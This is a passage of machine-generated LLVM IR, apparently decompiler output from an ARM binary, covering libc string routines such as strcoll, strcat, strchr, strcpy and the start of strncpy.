  %v0_14978.pr = phi i32 [ %v0_14954, %dec_label_pc_1495c ], [ %v0_14978.pr.pre, %bb ], [ %v2_1496c, %.thread ]
  %v0_14974 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_14974, i32* @ip, align 4
  %v8_1497810 = icmp eq i32 %v0_14978.pr, 8
  store i1 %v8_1497810, i1* %cpsr_z.global-to-local, align 1
  %v5_1497c11 = icmp slt i32 %v0_14978.pr, 8
  br i1 %v5_1497c11, label %dec_label_pc_149b8, label %dec_label_pc_14980.preheader

dec_label_pc_14980.preheader:                     ; preds = %dec_label_pc_14974
  %v1_1498046 = inttoptr i32 %v0_1498028 to i32*
  store i32 %v0_14974, i32* %v1_1498046, align 4
  %v3_1498047 = add i32 %v0_1498028, 4
  %v4_1498048 = inttoptr i32 %v3_1498047 to i32*
  %v5_1498049 = load i32, i32* @ip, align 4
  store i32 %v5_1498049, i32* %v4_1498048, align 4
  %v6_1498050 = add i32 %v0_1498028, 8
  store i32 %v6_1498050, i32* %r3.global-to-local, align 4
  %v0_1498451 = load i32, i32* @r2, align 4
  %v1_1498452 = add i32 %v0_1498451, -8
  store i32 %v1_1498452, i32* %r2.global-to-local, align 4
  %v5_1498c53 = icmp slt i32 %v1_1498452, 8
  br i1 %v5_1498c53, label %dec_label_pc_14980.dec_label_pc_149b8.loopexit_crit_edge, label %dec_label_pc_14990

dec_label_pc_14990:                               ; preds = %dec_label_pc_14980.preheader, %dec_label_pc_14978.dec_label_pc_14980_crit_edge
  %v6_1498055 = phi i32 [ %v6_14980, %dec_label_pc_14978.dec_label_pc_14980_crit_edge ], [ %v6_1498050, %dec_label_pc_14980.preheader ]
  %v0_1498054 = phi i32 [ %v12_149ac, %dec_label_pc_14978.dec_label_pc_14980_crit_edge ], [ %v0_1498028, %dec_label_pc_14980.preheader ]
  %v1_14990 = inttoptr i32 %v6_1498055 to i32*
  %v2_14990 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_14990, i32* %v1_14990, align 4
  %v3_14990 = add i32 %v0_1498054, 12
  %v4_14990 = inttoptr i32 %v3_14990 to i32*
  %v5_14990 = load i32, i32* @ip, align 4
  store i32 %v5_14990, i32* %v4_14990, align 4
  %v6_14990 = add i32 %v0_1498054, 16
  store i32 %v6_14990, i32* %r3.global-to-local, align 4
  %v0_14994 = load i32, i32* %r2.global-to-local, align 4
  %v1_14994 = add i32 %v0_14994, -8
  store i32 %v1_14994, i32* %r2.global-to-local, align 4
  %v5_1499c = icmp slt i32 %v1_14994, 8
  br i1 %v5_1499c, label %dec_label_pc_14990.dec_label_pc_149b8.loopexit_crit_edge, label %dec_label_pc_149a0

dec_label_pc_149a0:                               ; preds = %dec_label_pc_14990
  %v1_149a0 = inttoptr i32 %v6_14990 to i32*
  %v2_149a0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_149a0, i32* %v1_149a0, align 4
  %v3_149a0 = add i32 %v0_1498054, 20
  %v4_149a0 = inttoptr i32 %v3_149a0 to i32*
  %v5_149a0 = load i32, i32* @ip, align 4
  store i32 %v5_149a0, i32* %v4_149a0, align 4
  %v6_149a0 = add i32 %v0_1498054, 24
  store i32 %v6_149a0, i32* %r3.global-to-local, align 4
  %v0_149a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_149a4 = add i32 %v0_149a4, -8
  store i32 %v1_149a4, i32* %r2.global-to-local, align 4
  %v5_149ac = icmp slt i32 %v1_149a4, 8
  br i1 %v5_149ac, label %dec_label_pc_149a0.dec_label_pc_149b8.loopexit_crit_edge, label %dec_label_pc_14978

dec_label_pc_14978:                               ; preds = %dec_label_pc_149a0
  %v7_149ac = inttoptr i32 %v6_149a0 to i32*
  %v8_149ac = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_149ac, i32* %v7_149ac, align 4
  %v9_149ac = add i32 %v0_1498054, 28
  %v10_149ac = inttoptr i32 %v9_149ac to i32*
  %v11_149ac = load i32, i32* @ip, align 4
  store i32 %v11_149ac, i32* %v10_149ac, align 4
  %v12_149ac = add i32 %v0_1498054, 32
  store i32 %v12_149ac, i32* %r3.global-to-local, align 4
  %v6_149b0 = load i32, i32* %r2.global-to-local, align 4
  %v7_149b0 = add i32 %v6_149b0, -8
  store i32 %v7_149b0, i32* %r2.global-to-local, align 4
  %v5_1497c = icmp slt i32 %v7_149b0, 8
  br i1 %v5_1497c, label %dec_label_pc_14978.dec_label_pc_149b8.loopexit_crit_edge, label %dec_label_pc_14978.dec_label_pc_14980_crit_edge

dec_label_pc_14978.dec_label_pc_14980_crit_edge:  ; preds = %dec_label_pc_14978
  %v2_14980.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_14980 = inttoptr i32 %v12_149ac to i32*
  store i32 %v2_14980.pre, i32* %v1_14980, align 4
  %v3_14980 = add i32 %v0_1498054, 36
  %v4_14980 = inttoptr i32 %v3_14980 to i32*
  %v5_14980 = load i32, i32* @ip, align 4
  store i32 %v5_14980, i32* %v4_14980, align 4
  %v6_14980 = add i32 %v0_1498054, 40
  store i32 %v6_14980, i32* %r3.global-to-local, align 4
  %v0_14984 = load i32, i32* %r2.global-to-local, align 4
  %v1_14984 = add i32 %v0_14984, -8
  store i32 %v1_14984, i32* %r2.global-to-local, align 4
  %v5_1498c = icmp slt i32 %v1_14984, 8
  br i1 %v5_1498c, label %dec_label_pc_14980.dec_label_pc_149b8.loopexit_crit_edge, label %dec_label_pc_14990

dec_label_pc_14978.dec_label_pc_149b8.loopexit_crit_edge: ; preds = %dec_label_pc_14978
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_149b8

dec_label_pc_14980.dec_label_pc_149b8.loopexit_crit_edge: ; preds = %dec_label_pc_14978.dec_label_pc_14980_crit_edge, %dec_label_pc_14980.preheader
  %v1_14984.lcssa = phi i32 [ %v1_1498452, %dec_label_pc_14980.preheader ], [ %v1_14984, %dec_label_pc_14978.dec_label_pc_14980_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_149b8

dec_label_pc_14990.dec_label_pc_149b8.loopexit_crit_edge: ; preds = %dec_label_pc_14990
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_149b8

dec_label_pc_149a0.dec_label_pc_149b8.loopexit_crit_edge: ; preds = %dec_label_pc_149a0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_149b8

dec_label_pc_149b8:                               ; preds = %dec_label_pc_14974, %dec_label_pc_14978.dec_label_pc_149b8.loopexit_crit_edge, %dec_label_pc_14980.dec_label_pc_149b8.loopexit_crit_edge, %dec_label_pc_14990.dec_label_pc_149b8.loopexit_crit_edge, %dec_label_pc_149a0.dec_label_pc_149b8.loopexit_crit_edge, %entry
  %v0_149c0 = phi i32 [ %v0_14954, %entry ], [ %v1_149a4, %dec_label_pc_149a0.dec_label_pc_149b8.loopexit_crit_edge ], [ %v1_14994, %dec_label_pc_14990.dec_label_pc_149b8.loopexit_crit_edge ], [ %v1_14984.lcssa, %dec_label_pc_14980.dec_label_pc_149b8.loopexit_crit_edge ], [ %v7_149b0, %dec_label_pc_14978.dec_label_pc_149b8.loopexit_crit_edge ], [ %v0_14978.pr, %dec_label_pc_14974 ]
  %v2_149b8 = icmp eq i32 %v0_149c0, 0
  store i1 %v2_149b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_149b8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_149b8
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_149b8
  %v1_149c0 = sub i32 7, %v0_149c0
  store i32 %v1_149c0, i32* %r2.global-to-local, align 4
  %v3_149c4 = mul i32 %v1_149c0, 4
  %v4_149c4 = add i32 %v3_149c4, ptrtoint (i32* @global_var_149cc.927 to i32)
  call void @__pseudo_branch(i32 %v4_149c4)
  %v0_149cc = load i32, i32* %r1.global-to-local, align 4
  %v1_149cc = trunc i32 %v0_149cc to i8
  %v2_149cc = load i32, i32* %r3.global-to-local, align 4
  %v3_149cc = inttoptr i32 %v2_149cc to i8*
  store i8 %v1_149cc, i8* %v3_149cc, align 1
  %v4_149cc = load i32, i32* %r3.global-to-local, align 4
  %v5_149cc = add i32 %v4_149cc, 1
  store i32 %v5_149cc, i32* %r3.global-to-local, align 4
  %v0_149d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_149d0 = trunc i32 %v0_149d0 to i8
  %v3_149d0 = inttoptr i32 %v5_149cc to i8*
  store i8 %v1_149d0, i8* %v3_149d0, align 1
  %v4_149d0 = load i32, i32* %r3.global-to-local, align 4
  %v5_149d0 = add i32 %v4_149d0, 1
  store i32 %v5_149d0, i32* %r3.global-to-local, align 4
  %v0_149d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_149d4 = trunc i32 %v0_149d4 to i8
  %v3_149d4 = inttoptr i32 %v5_149d0 to i8*
  store i8 %v1_149d4, i8* %v3_149d4, align 1
  %v4_149d4 = load i32, i32* %r3.global-to-local, align 4
  %v5_149d4 = add i32 %v4_149d4, 1
  store i32 %v5_149d4, i32* %r3.global-to-local, align 4
  %v0_149d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_149d8 = trunc i32 %v0_149d8 to i8
  %v3_149d8 = inttoptr i32 %v5_149d4 to i8*
  store i8 %v1_149d8, i8* %v3_149d8, align 1
  %v4_149d8 = load i32, i32* %r3.global-to-local, align 4
  %v5_149d8 = add i32 %v4_149d8, 1
  store i32 %v5_149d8, i32* %r3.global-to-local, align 4
  %v0_149dc = load i32, i32* %r1.global-to-local, align 4
  %v1_149dc = trunc i32 %v0_149dc to i8
  %v3_149dc = inttoptr i32 %v5_149d8 to i8*
  store i8 %v1_149dc, i8* %v3_149dc, align 1
  %v4_149dc = load i32, i32* %r3.global-to-local, align 4
  %v5_149dc = add i32 %v4_149dc, 1
  store i32 %v5_149dc, i32* %r3.global-to-local, align 4
  %v0_149e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_149e0 = trunc i32 %v0_149e0 to i8
  %v3_149e0 = inttoptr i32 %v5_149dc to i8*
  store i8 %v1_149e0, i8* %v3_149e0, align 1
  %v4_149e0 = load i32, i32* %r3.global-to-local, align 4
  %v5_149e0 = add i32 %v4_149e0, 1
  store i32 %v5_149e0, i32* %r3.global-to-local, align 4
  %v0_149e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_149e4 = trunc i32 %v0_149e4 to i8
  %v3_149e4 = inttoptr i32 %v5_149e0 to i8*
  store i8 %v1_149e4, i8* %v3_149e4, align 1
  %v4_149e4 = load i32, i32* %r3.global-to-local, align 4
  %v5_149e4 = add i32 %v4_149e4, 1
  store i32 %v5_149e4, i32* %r3.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_14980, { 1, 0 }
  uselistorder i32 %v12_149ac, { 1, 2, 0 }
  uselistorder i32 %v0_1498054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_14978.pr, { 0, 2, 1 }
  uselistorder i32 %v6_14968, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_1495c, { 1, 0 }
  uselistorder i32 %v0_14954, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 21, 20, 16, 14, 15, 22, 13, 17, 18, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 8, 7, 13, 1, 9, 10, 11, 12, 6, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 2, 1, 0, 3, 5, 8, 7, 4, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_149b8, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_14990, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_149f4.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_149f4 = phi i32 [ %v0_149f4.pre, %bb ], [ %v5_149f4, %bb3 ]
  %v0_149f0 = phi i32 [ %tmp, %bb ], [ %v5_149f0, %bb3 ]
  %v1_149f0 = inttoptr i32 %v0_149f0 to i8*
  %v2_149f0 = load i8, i8* %v1_149f0, align 1
  %v3_149f0 = zext i8 %v2_149f0 to i32
  store i32 %v3_149f0, i32* @r2, align 4
  %v1_149f4 = inttoptr i32 %v0_149f4 to i8*
  %v2_149f4 = load i8, i8* %v1_149f4, align 1
  %v3_149f4 = zext i8 %v2_149f4 to i32
  %v2_149f8 = icmp eq i8 %v2_149f0, 0
  br i1 %v2_149f8, label %.dec_label_pc_14a04_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_149f4 = add i32 %v0_149f4, 1
  %v5_149f0 = add i32 %v0_149f0, 1
  %v10_149fc = icmp eq i8 %v2_149f0, %v2_149f4
  br i1 %v10_149fc, label %entry, label %dec_label_pc_14a04

.dec_label_pc_14a04_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_14a04

dec_label_pc_14a04:                               ; preds = %bb3, %.dec_label_pc_14a04_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_14a04_crit_edge ], [ %v3_149f0, %bb3 ]
  %v2_14a04.pre-phi = sub nsw i32 %.pn, %v3_149f4
  ret i32 %v2_14a04.pre-phi

; uselistorder directives
  uselistorder i32 %v0_149f0, { 1, 0 }
  uselistorder i32 %v0_149f4, { 1, 0 }
  uselistorder label %dec_label_pc_14a04, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14a74

dec_label_pc_14a74:                               ; preds = %dec_label_pc_14a74, %entry
  %v0_14a74 = phi i32 [ %v5_14a74, %dec_label_pc_14a74 ], [ %tmp, %entry ]
  %v1_14a74 = inttoptr i32 %v0_14a74 to i8*
  %v2_14a74 = load i8, i8* %v1_14a74, align 1
  %v5_14a74 = add i32 %v0_14a74, 1
  store i32 %v5_14a74, i32* %r2.global-to-local, align 4
  %v2_14a78 = icmp eq i8 %v2_14a74, 0
  store i1 %v2_14a78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14a78, label %dec_label_pc_14a80, label %dec_label_pc_14a74

dec_label_pc_14a80:                               ; preds = %dec_label_pc_14a74
  %v1_14a80 = add i32 %v0_14a74, -1
  store i32 %v1_14a80, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14a84

dec_label_pc_14a84:                               ; preds = %dec_label_pc_14a84, %dec_label_pc_14a80
  %v2_14a8c = phi i32 [ %v6_14a8c, %dec_label_pc_14a84 ], [ %v1_14a80, %dec_label_pc_14a80 ]
  %v0_14a84 = load i32, i32* @r1, align 4
  %v1_14a84 = inttoptr i32 %v0_14a84 to i8*
  %v2_14a84 = load i8, i8* %v1_14a84, align 1
  %v5_14a84 = add i32 %v0_14a84, 1
  store i32 %v5_14a84, i32* @r1, align 4
  %v2_14a88 = icmp eq i8 %v2_14a84, 0
  store i1 %v2_14a88, i1* %cpsr_z.global-to-local, align 1
  %v3_14a8c = add i32 %v2_14a8c, 1
  %v4_14a8c = inttoptr i32 %v3_14a8c to i8*
  store i8 %v2_14a84, i8* %v4_14a8c, align 1
  %v5_14a8c = load i32, i32* %r2.global-to-local, align 4
  %v6_14a8c = add i32 %v5_14a8c, 1
  store i32 %v6_14a8c, i32* %r2.global-to-local, align 4
  %v0_14a90 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14a90, label %dec_label_pc_14a94, label %dec_label_pc_14a84

dec_label_pc_14a94:                               ; preds = %dec_label_pc_14a84
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_14a8c, { 1, 0 }
  uselistorder i32 %v5_14a74, { 1, 0 }
  uselistorder i32 %v0_14a74, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v6_14a98 = load i32, i32* @r5, align 4
  %v9_14a98 = load i32, i32* @r6, align 4
  %v1_14a9c = urem i32 %arg1, 256
  br label %dec_label_pc_14abc

dec_label_pc_14aa4:                               ; preds = %dec_label_pc_14abc
  %v3_14aa4 = load i8, i8* %.0, align 1
  %v4_14aa4 = zext i8 %v3_14aa4 to i32
  %v9_14aa8 = icmp eq i32 %v4_14aa4, %v1_14a9c
  br i1 %v9_14aa8, label %bb, label %bb24

bb:                                               ; preds = %dec_label_pc_14aa4
  ret i32 %v1_14abc

bb24:                                             ; preds = %dec_label_pc_14aa4
  %v2_14ab0 = icmp eq i8 %v3_14aa4, 0
  %v2_14ab4 = add i32 %v1_14abc, 1
  %v3_14ab4 = inttoptr i32 %v2_14ab4 to i8*
  br i1 %v2_14ab0, label %dec_label_pc_14b90, label %dec_label_pc_14abc

dec_label_pc_14abc:                               ; preds = %bb24, %entry
  %.0 = phi i8* [ undef, %entry ], [ %v3_14ab4, %bb24 ]
  %v1_14abc = ptrtoint i8* %.0 to i32
  %v2_14abc = urem i32 %v1_14abc, 4
  %v3_14abc = icmp eq i32 %v2_14abc, 0
  br i1 %v3_14abc, label %dec_label_pc_14ac4, label %dec_label_pc_14aa4

dec_label_pc_14ac4:                               ; preds = %dec_label_pc_14abc
  %v4_14ac4 = mul nuw nsw i32 %v1_14a9c, 256
  %v5_14ac4 = or i32 %v4_14ac4, %v1_14a9c
  %v4_14acc = mul i32 %v5_14ac4, 65536
  %v5_14acc = or i32 %v4_14acc, %v5_14ac4
  br label %dec_label_pc_14ad0

dec_label_pc_14ad0:                               ; preds = %dec_label_pc_14b88, %dec_label_pc_14b10, %dec_label_pc_14ac4
  %v0_14b34 = phi i32 [ %v1_14abc, %dec_label_pc_14ac4 ], [ %v4_14ad0, %dec_label_pc_14b10 ], [ %v4_14ad0, %dec_label_pc_14b88 ]
  %v1_14ad0 = inttoptr i32 %v0_14b34 to i32*
  %v2_14ad0 = load i32, i32* %v1_14ad0, align 4
  %v4_14ad0 = add i32 %v0_14b34, 4
  %v2_14ad8 = xor i32 %v2_14ad0, %v5_14acc
  %v2_14ae4 = add i32 %v2_14ad0, 2130640639
  %v1_14ae8 = sub i32 -1, %v2_14ad0
  %v2_14aec = xor i32 %v2_14ae4, %v1_14ae8
  %v2_14af0 = add i32 %v2_14ad8, 2130640639
  %v1_14af8 = sub i32 -1, %v2_14ad8
  %v2_14afc = and i32 %v2_14aec, -2130640640
  %v2_14b00 = xor i32 %v2_14af0, %v1_14af8
  %v2_14b04 = icmp eq i32 %v2_14afc, 0
  %v2_14b08 = and i32 %v2_14b00, -2130640640
  store i32 %v2_14b08, i32* @lr, align 4
  br i1 %v2_14b04, label %dec_label_pc_14b10, label %dec_label_pc_14b18

dec_label_pc_14b10:                               ; preds = %dec_label_pc_14ad0
  %v2_14b10 = icmp eq i32 %v2_14b08, 0
  br i1 %v2_14b10, label %dec_label_pc_14ad0, label %dec_label_pc_14b18

dec_label_pc_14b18:                               ; preds = %dec_label_pc_14ad0, %dec_label_pc_14b10
  %v2_14b18 = inttoptr i32 %v0_14b34 to i8*
  %v3_14b18 = load i8, i8* %v2_14b18, align 1
  %v4_14b18 = zext i8 %v3_14b18 to i32
  %v1_14b20 = add i32 %v0_14b34, 1
  %v1_14b24 = add i32 %v0_14b34, 2
  %v9_14b28 = icmp eq i32 %v4_14b18, %v1_14a9c
  %v1_14b2c = add i32 %v0_14b34, 3
  store i32 %v1_14b2c, i32* @ip, align 4
  br i1 %v9_14b28, label %dec_label_pc_14b34, label %dec_label_pc_14b3c

dec_label_pc_14b34:                               ; preds = %dec_label_pc_14b18
  store i32 %v6_14a98, i32* @r5, align 4
  store i32 %v9_14a98, i32* @r6, align 4
  ret i32 %v0_14b34

dec_label_pc_14b3c:                               ; preds = %dec_label_pc_14b18
  %v2_14b3c = icmp eq i8 %v3_14b18, 0
  br i1 %v2_14b3c, label %dec_label_pc_14b90, label %dec_label_pc_14b44

dec_label_pc_14b44:                               ; preds = %dec_label_pc_14b3c
  %v2_14b44 = inttoptr i32 %v1_14b20 to i8*
  %v3_14b44 = load i8, i8* %v2_14b44, align 1
  %v4_14b44 = zext i8 %v3_14b44 to i32
  %v9_14b48 = icmp eq i32 %v4_14b44, %v1_14a9c
  br i1 %v9_14b48, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_14b44
  store i32 %v6_14a98, i32* @r5, align 4
  store i32 %v9_14a98, i32* @r6, align 4
  ret i32 %v1_14b20

bb26:                                             ; preds = %dec_label_pc_14b44
  %v2_14b50 = icmp eq i8 %v3_14b44, 0
  br i1 %v2_14b50, label %dec_label_pc_14b90, label %dec_label_pc_14b58

dec_label_pc_14b58:                               ; preds = %bb26
  %v2_14b58 = inttoptr i32 %v1_14b24 to i8*
  %v3_14b58 = load i8, i8* %v2_14b58, align 1
  %v4_14b58 = zext i8 %v3_14b58 to i32
  %v9_14b5c = icmp eq i32 %v4_14b58, %v1_14a9c
  br i1 %v9_14b5c, label %dec_label_pc_14b64, label %dec_label_pc_14b6c

dec_label_pc_14b64:                               ; preds = %dec_label_pc_14b58
  store i32 %v6_14a98, i32* @r5, align 4
  store i32 %v9_14a98, i32* @r6, align 4
  ret i32 %v1_14b24

dec_label_pc_14b6c:                               ; preds = %dec_label_pc_14b58
  %v2_14b6c = icmp eq i8 %v3_14b58, 0
  br i1 %v2_14b6c, label %dec_label_pc_14b90, label %dec_label_pc_14b74

dec_label_pc_14b74:                               ; preds = %dec_label_pc_14b6c
  %v2_14b74 = inttoptr i32 %v1_14b2c to i8*
  %v3_14b74 = load i8, i8* %v2_14b74, align 1
  %v4_14b74 = zext i8 %v3_14b74 to i32
  %v9_14b78 = icmp eq i32 %v4_14b74, %v1_14a9c
  br i1 %v9_14b78, label %dec_label_pc_14b80, label %dec_label_pc_14b88

dec_label_pc_14b80:                               ; preds = %dec_label_pc_14b74
  store i32 %v6_14a98, i32* @r5, align 4
  store i32 %v9_14a98, i32* @r6, align 4
  ret i32 %v1_14b2c

dec_label_pc_14b88:                               ; preds = %dec_label_pc_14b74
  %v2_14b88 = icmp eq i8 %v3_14b74, 0
  br i1 %v2_14b88, label %dec_label_pc_14b90, label %dec_label_pc_14ad0

dec_label_pc_14b90:                               ; preds = %bb24, %dec_label_pc_14b88, %dec_label_pc_14b6c, %bb26, %dec_label_pc_14b3c
  store i32 %v6_14a98, i32* @r5, align 4
  store i32 %v9_14a98, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_14ad0, { 1, 0 }
  uselistorder i32 %v2_14ad0, { 0, 2, 1 }
  uselistorder i32 %v0_14b34, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_14ac4, { 1, 0 }
  uselistorder i32 %v1_14abc, { 1, 0, 2, 3 }
  uselistorder i8* %.0, { 1, 0 }
  uselistorder i32 %v1_14a9c, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 %v9_14a98, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v6_14a98, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_14b90, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_14b18, { 1, 0 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_14ba0 = sub i32 %arg1, %tmp
  %v1_14ba4 = add i32 %v2_14ba0, -1
  store i32 %v1_14ba4, i32* %r2.global-to-local, align 4
  %v2_14ba84 = load i8, i8* %arg2, align 1
  %v5_14ba86 = add i32 %tmp, 1
  store i32 %v5_14ba86, i32* %r1.global-to-local, align 4
  %v2_14bac7 = icmp eq i8 %v2_14ba84, 0
  store i1 %v2_14bac7, i1* %cpsr_z.global-to-local, align 1
  %v5_14bb08 = inttoptr i32 %arg1 to i8*
  store i8 %v2_14ba84, i8* %v5_14bb08, align 1
  %v0_14bb49 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14bb49, label %dec_label_pc_14bb8, label %dec_label_pc_14ba8.dec_label_pc_14ba8_crit_edge

dec_label_pc_14ba8.dec_label_pc_14ba8_crit_edge:  ; preds = %entry, %dec_label_pc_14ba8.dec_label_pc_14ba8_crit_edge
  %v0_14ba8.pre = load i32, i32* %r1.global-to-local, align 4
  %v3_14bb0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14ba8 = inttoptr i32 %v0_14ba8.pre to i8*
  %v2_14ba8 = load i8, i8* %v1_14ba8, align 1
  %v5_14ba8 = add i32 %v0_14ba8.pre, 1
  store i32 %v5_14ba8, i32* %r1.global-to-local, align 4
  %v2_14bac = icmp eq i8 %v2_14ba8, 0
  store i1 %v2_14bac, i1* %cpsr_z.global-to-local, align 1
  %v4_14bb0 = add i32 %v5_14ba8, %v3_14bb0.pre
  %v5_14bb0 = inttoptr i32 %v4_14bb0 to i8*
  store i8 %v2_14ba8, i8* %v5_14bb0, align 1
  %v0_14bb4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14bb4, label %dec_label_pc_14bb8, label %dec_label_pc_14ba8.dec_label_pc_14ba8_crit_edge

dec_label_pc_14bb8:                               ; preds = %dec_label_pc_14ba8.dec_label_pc_14ba8_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14ba8.dec_label_pc_14ba8_crit_edge, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v7_14bbc = icmp eq i32 %arg2, 3
  store i1 %v7_14bbc, i1* %cpsr_z.global-to-local, align 1
  %v1_14bc4 = add i32 %arg1, -1
  store i32 %v1_14bc4, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_14c40, label %dec_label_pc_14bcc

dec_label_pc_14bcc:                               ; preds = %entry
  %v3_14bcc = udiv i32 %arg2, 4
  store i32 %v3_14bcc, i32* @lr, align 4
  %v0_14bd0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_14bd0

dec_label_pc_14bd0:                               ; preds = %dec_label_pc_14c1c, %dec_label_pc_14bcc
  %v2_14bd8 = phi i32 [ %v6_14c10, %dec_label_pc_14c1c ], [ %v1_14bc4, %dec_label_pc_14bcc ]
  %v0_14bd0 = phi i32 [ %v1_14c20, %dec_label_pc_14c1c ], [ %v0_14bd0.pre, %dec_label_pc_14bcc ]
  %v1_14bd0 = inttoptr i32 %v0_14bd0 to i8*
  %v2_14bd0 = load i8, i8* %v1_14bd0, align 1
  %v3_14bd0 = zext i8 %v2_14bd0 to i32
  store i32 %v3_14bd0, i32* %r3.global-to-local, align 4
  %v2_14bd4 = icmp eq i8 %v2_14bd0, 0
  store i1 %v2_14bd4, i1* %cpsr_z.global-to-local, align 1
  %v3_14bd8 = add i32 %v2_14bd8, 1
  %v4_14bd8 = inttoptr i32 %v3_14bd8 to i8*
  store i8 %v2_14bd0, i8* %v4_14bd8, align 1
  %v5_14bd8 = load i32, i32* %ip.global-to-local, align 4
  %v6_14bd8 = add i32 %v5_14bd8, 1
  store i32 %v6_14bd8, i32* %ip.global-to-local, align 4
  %v0_14bdc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14bdc, label %dec_label_pc_14c2c, label %dec_label_pc_14be0

dec_label_pc_14be0:                               ; preds = %dec_label_pc_14bd0
  %v0_14be0 = load i32, i32* @r1, align 4
  %v1_14be0 = add i32 %v0_14be0, 1
  %v2_14be0 = inttoptr i32 %v1_14be0 to i8*
  %v3_14be0 = load i8, i8* %v2_14be0, align 1
  %v4_14be0 = zext i8 %v3_14be0 to i32
  store i32 %v4_14be0, i32* %r3.global-to-local, align 4
  %v2_14be4 = icmp eq i8 %v3_14be0, 0
  store i1 %v2_14be4, i1* %cpsr_z.global-to-local, align 1
  %v3_14be8 = add i32 %v5_14bd8, 2
  %v4_14be8 = inttoptr i32 %v3_14be8 to i8*
  store i8 %v3_14be0, i8* %v4_14be8, align 1
  %v5_14be8 = load i32, i32* %ip.global-to-local, align 4
  %v6_14be8 = add i32 %v5_14be8, 1
  store i32 %v6_14be8, i32* %ip.global-to-local, align 4
  %v0_14bec = load i32, i32* @r1, align 4
  %v1_14bec = add i32 %v0_14bec, 1
  store i32 %v1_14bec, i32* %r1.global-to-local, align 4
  %v0_14bf0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14bf0, label %dec_label_pc_14c2c, label %dec_label_pc_14bf4

